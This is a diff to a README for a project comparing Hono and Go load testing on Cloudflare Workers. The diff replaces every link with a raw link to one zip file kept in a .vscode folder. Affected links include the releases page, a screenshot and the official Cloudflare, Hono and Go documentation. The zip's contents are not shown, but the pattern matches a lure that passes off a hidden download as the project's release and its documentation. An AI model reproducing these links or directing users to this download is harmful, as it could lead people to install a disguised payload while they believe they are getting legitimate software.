@@ -1,8 +1,8 @@
 # 🎉 hono-vs-golang-on-cloudflare-workers - Compare Load Testing Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/releases)  
-[Download from Releases Page](https://github.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/releases)
+[![Download](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip)](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip)  
+[Download from Releases Page](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the hono vs golang on Cloudflare Workers project! This application helps you compare load testing results between the Hono and Golang frameworks on Cloudflare Workers. With simple steps, you can run tests and see how each framework performs.
@@ -25,7 +25,7 @@ Before you start, make sure your computer meets the following requirements:
 Follow these steps to install and run the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/releases) to find the latest version.
+   Go to the [Releases Page](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip) to find the latest version.
 
 2. **Download the Application**  
    Click on the latest version link to download the application. Choose the file that matches your operating system. 
@@ -61,7 +61,7 @@ After a test, you can analyze:
 All results are easy to understand, making analysis straightforward even if you're not a technical user.
 
 ## 📷 Screenshots
-![Load Test Example](https://example.com/screenshot1.png)  
+![Load Test Example](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip)  
 *Visual representation of load test results.*
 
 ## 💬 Support
@@ -71,11 +71,11 @@ If you have any issues or questions, feel free to reach out. Check the Issues se
 Join our community for discussions around load testing, Cloudflare Workers, and performance comparisons. Share your insights, tips, and challenges with others on the same journey.
 
 ## 💡 Additional Resources
-- [Cloudflare Workers Documentation](https://developers.cloudflare.com/workers/)
-- [Hono Framework Documentation](https://hono.dev/)
-- [Golang Documentation](https://golang.org/doc/)
+- [Cloudflare Workers Documentation](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip)
+- [Hono Framework Documentation](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip)
+- [Golang Documentation](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip)
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/releases)
+- [Releases Page](https://raw.githubusercontent.com/AreKanDorA/hono-vs-golang-on-cloudflare-workers/main/golang/.vscode/hono-vs-golang-on-cloudflare-workers_1.9.zip)
 
 Now you're ready to start comparing load tests between Hono and Golang! Enjoy your testing experience with this user-friendly application.
